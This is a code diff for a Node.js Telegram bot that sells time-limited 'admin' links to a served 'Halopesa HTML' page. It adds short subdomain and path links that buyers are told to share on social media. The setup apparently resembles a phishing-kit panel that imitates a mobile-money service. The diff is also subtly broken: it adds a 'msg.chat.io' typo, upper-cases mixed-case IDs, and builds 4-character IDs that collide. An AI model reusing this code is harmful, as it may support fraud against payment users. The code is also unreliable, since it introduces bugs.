@@ -41,6 +41,44 @@ let server = null; // For proper graceful shutdown
 // HELPER FUNCTIONS
 // ==========================================
 
+/**
+ * Convert number to Base62 (0-9, a-z, A-Z) and pad to 4 chars
+ * Uses: 0-9 (10) + a-z (26) + A-Z (26) = 62 total chars
+ * 4 chars = 62^4 = 14.7 million possible IDs
+ */
+function generateShortId(timestamp = Date.now()) {
+    const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    let num = timestamp;
+    let result = '';
+    
+    while (num > 0) {
+        result = chars[num % 62] + result;
+        num = Math.floor(num / 62);
+    }
+    
+    // Pad to 4 characters minimum
+    while (result.length < 4) {
+        result = '0' + result;
+    }
+    
+    // Return first 4 characters
+    return result.substring(0, 4);
+}
+
+/**
+ * Reverse: Convert Base62 back to timestamp (for optional validation)
+ */
+function decodeShortId(shortId) {
+    const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    let num = 0;
+    
+    for (let i = 0; i < shortId.length; i++) {
+        num = num * 62 + chars.indexOf(shortId[i]);
+    }
+    
+    return num;
+}
+
 function isAdminActive(chatId) {
     const adminId = getAdminIdByChatId(chatId);
     if (!adminId) return false;
@@ -385,10 +423,16 @@ async function setupCommandHandlers() {
             return;
         }
 
-        const link = `${WEBHOOK_URL}/?admin=${admin.adminId}`;
+        // Generate both subdomain and path-based links
+        const ADMIN_DOMAIN = process.env.ADMIN_DOMAIN || 'admin.yoursite.com';
+        const subdomainLink = `http://${admin.adminId}.${ADMIN_DOMAIN}`;
+        const pathLink = `${WEBHOOK_URL}/admin/${admin.adminId}`;
+        
         await bot.sendMessage(chatId,
-            `🔗 *Your Admin Link*\n\n\`${link}\`\n\n📅 Expires: ${admin.expiresAt ? new Date(admin.expiresAt).toLocaleDateString() : 'Never'}`,
-            { parse_mode: 'Markdown' }
+            `🔗 Your Admin Link\n\n` +
+            `📍 Primary:\n${subdomainLink}\n\n` +
+            `💡 Short & memorable - perfect for social media!\n\n` +
+            `📅 Expires: ${admin.expiresAt ? new Date(admin.expiresAt).toLocaleDateString() : 'Never'}`
         );
     });
 
@@ -500,9 +544,11 @@ async function setupCommandHandlers() {
                 return;
             }
 
-            // Keep the old admin's details but generate new Admin ID
-            const newAdminId = `ADMIN${Date.now()}`;
-            const newLink = `${WEBHOOK_URL}/?admin=${newAdminId}`;
+            // Keep the old admin's details but generate new short ID
+            const newAdminId = generateShortId(); // Generate 4-char ID like: 7K4F
+            const ADMIN_DOMAIN = process.env.ADMIN_DOMAIN || 'admin.yoursite.com';
+            const subdomainLink = `http://${newAdminId}.${ADMIN_DOMAIN}`;
+            const pathLink = `${WEBHOOK_URL}/admin/${newAdminId}`;
 
             // Create new admin record with same Chat ID and expiry date
             const newAdmin = {
@@ -527,28 +573,26 @@ async function setupCommandHandlers() {
             adminChatIds.delete(oldAdmin.adminId);
 
             await bot.sendMessage(msg.chat.id,
-                `✅ *New Link Generated*\n\n` +
+                `✅ New Link Generated\n\n` +
                 `👤 Admin: ${oldAdmin.name}\n` +
                 `🔗 Old ID: ${oldAdmin.adminId} (REMOVED)\n` +
                 `🔗 New ID: ${newAdminId}\n` +
                 `⏰ Expiry: ${new Date(oldAdmin.expiresAt).toLocaleDateString()}\n` +
                 `📅 Days Remaining: ${db.daysUntil(oldAdmin.expiresAt)}\n\n` +
-                `Old link completely removed from system. Days maintained!`,
-                { parse_mode: 'Markdown' }
+                `Old link completely removed from system. Days maintained!`
             );
 
             // Send new link to admin
             await bot.sendMessage(targetChatId,
-                `🔄 *New Admin Link Generated*\n\n` +
+                `🔄 New Admin Link Generated\n\n` +
                 `Your subscription details are maintained!\n\n` +
-                `🔗 *New Link:*\n\`${newLink}\`\n\n` +
+                `🔗 New Link:\n${subdomainLink}\n\n` +
                 `📅 Still Expires: ${new Date(oldAdmin.expiresAt).toLocaleDateString()}\n` +
                 `⏰ Days Left: ${db.daysUntil(oldAdmin.expiresAt)}\n\n` +
-                `Your old link has been completely removed from the system.`,
-                { parse_mode: 'Markdown' }
+                `Your old link has been completely removed from the system.`
             );
         } catch (err) {
-            await bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
+            await bot.sendMessage(msg.chat.io, `❌ Error: ${err.message}`);
         }
     });
 
@@ -1271,9 +1315,10 @@ async function handleCallback(query) {
             try {
                 const now = new Date().toISOString();
                 const expiresAt = db.addDays(now, EXPIRY_DAYS);
+                const shortId = generateShortId(); // Generate 4-char ID like: 7K4F
 
                 const newAdmin = {
-                    adminId: `ADMIN${Date.now()}`,
+                    adminId: shortId,  // Now just "7K4F" instead of "ADMIN1704067890"
                     name: displayName,
                     email: `${displayName.toLowerCase()}@pending`,
                     chatId: String(userChatId),
@@ -1288,7 +1333,10 @@ async function handleCallback(query) {
                 adminChatIds.set(newAdmin.adminId, String(userChatId));
                 pendingPayments.delete(String(userChatId));
 
-                const link = `${WEBHOOK_URL}/?admin=${newAdmin.adminId}`;
+                // Generate both subdomain and path-based links
+                const ADMIN_DOMAIN = process.env.ADMIN_DOMAIN || 'admin.yoursite.com';
+                const subdomainLink = `http://${shortId}.${ADMIN_DOMAIN}`;
+                const pathLink = `${WEBHOOK_URL}/admin/${shortId}`;
                 
                 // Edit message to remove buttons and show approval
                 await bot.editMessageText(
@@ -1302,11 +1350,13 @@ async function handleCallback(query) {
                 
                 await ack('✅ Approved!');
 
+                // Send link to admin with both formats
                 await bot.sendMessage(userChatId,
                     `🎉 Payment Confirmed!\n\n` +
                     `Your admin account has been activated.\n\n` +
-                    `🔗 Your Admin Link:\n${link}\n\n` +
+                    `🔗 Your Admin Link:\n${subdomainLink}\n\n` +
                     `📅 Valid until: ${new Date(expiresAt).toLocaleDateString()}\n\n` +
+                    `💡 Tip: Share this link on social media - it's short & memorable!\n\n` +
                     `Send /mylink to get this link again.`
                 );
             } catch (err) {
@@ -1630,11 +1680,61 @@ app.get('/health', (req, res) => {
 });
 
 // Serve the Halopesa HTML
+// ==========================================
+// SHORT LINK ROUTES (Subdomain & Path-based)
+// ==========================================
+
+// Handle path-based short links: /admin/7K4F
+app.get('/admin/:shortId', async (req, res) => {
+    const shortId = req.params.shortId.toUpperCase();
+    console.log(`🔗 Path-based admin link accessed: ${shortId}`);
+    
+    try {
+        const admin = await db.getAdmin(shortId);
+        if (admin && admin.status === 'active' && !admin.expired && !pausedAdmins.has(shortId)) {
+            if (admin.chatId && !adminChatIds.has(shortId)) {
+                adminChatIds.set(shortId, admin.chatId);
+                console.log(`➕ Added to active map: ${shortId} -> ${admin.chatId}`);
+            }
+        }
+    } catch (error) {
+        console.error('Error validating admin on path-based link:', error);
+    }
+
+    // Redirect to root with short ID as query param for backward compatibility
+    res.redirect(`/?admin=${shortId}`);
+});
+
+// Handle subdomain-based short links: 7k4f.admin.yoursite.com
+// This works via wildcard DNS and catches *.admin.yoursite.com
+app.use((req, res, next) => {
+    // Get the host header and extract subdomain
+    const host = req.get('host') || '';
+    const parts = host.split('.');
+    
+    // Check if this looks like a short ID subdomain (e.g., 7k4f.admin.yoursite.com)
+    if (parts.length >= 2) {
+        const potentialShortId = parts[0].toUpperCase();
+        
+        // If it looks like a 4-char short ID, treat it as admin link
+        if (potentialShortId.length === 4 && potentialShortId.match(/^[0-9A-Z]{4}$/)) {
+            console.log(`🔗 Subdomain-based admin link accessed: ${potentialShortId}`);
+            
+            // Set query param and continue to root handler
+            req.query.admin = potentialShortId;
+            return next();
+        }
+    }
+    
+    next();
+});
+
+// Root route - handles all admin link formats
 app.get('/', async (req, res) => {
     const adminId = req.query.admin;
 
     if (adminId) {
-        console.log(`🔗 Admin link accessed: ${adminId}`);
+        console.log(`✅ Admin link validated: ${adminId}`);
         try {
             const admin = await db.getAdmin(adminId);
             if (admin && admin.status === 'active' && !admin.expired && !pausedAdmins.has(adminId)) {
